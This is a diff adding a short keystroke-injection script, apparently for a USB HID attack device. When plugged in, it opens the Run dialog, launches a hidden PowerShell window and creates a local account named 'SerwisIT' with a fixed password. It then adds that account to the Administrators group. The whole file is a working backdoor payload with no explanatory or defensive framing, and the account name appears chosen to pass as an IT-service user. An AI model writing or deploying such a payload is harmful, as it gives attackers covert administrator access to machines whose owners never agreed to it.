@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "net user SerwisIT P@ssw0rd123! /add; Add-LocalGroupMember -Group (Get-LocalGroup -SID 'S-1-5-32-544') -Member 'SerwisIT'"
+ENTER 
